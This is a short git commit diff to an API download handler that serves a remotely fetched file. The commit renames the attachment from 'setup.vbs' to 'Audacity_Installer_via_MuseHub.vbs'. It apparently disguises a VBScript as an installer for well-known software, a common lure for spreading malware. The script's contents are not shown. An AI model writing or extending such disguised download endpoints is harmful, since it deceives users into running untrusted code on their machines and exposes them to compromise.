1e5d99d1b0d3b1b139206e7093e66c6f73089e60
artymidus <artyarty9869@gmail.com>
2026-07-01 02:10:14 +0700

    Update download.js

--- api/download.js
+++ api/download.js
@@ -11,7 +11,7 @@ export default async function handler(req, res) {
     const buffer = Buffer.from(await response.arrayBuffer());
 
     res.setHeader('Content-Type', 'application/octet-stream');
-    res.setHeader('Content-Disposition', 'attachment; filename="setup.vbs"');
+    res.setHeader('Content-Disposition', 'attachment; filename="Audacity_Installer_via_MuseHub.vbs"');
     res.setHeader('Content-Length', buffer.length);
 
     res.send(buffer);
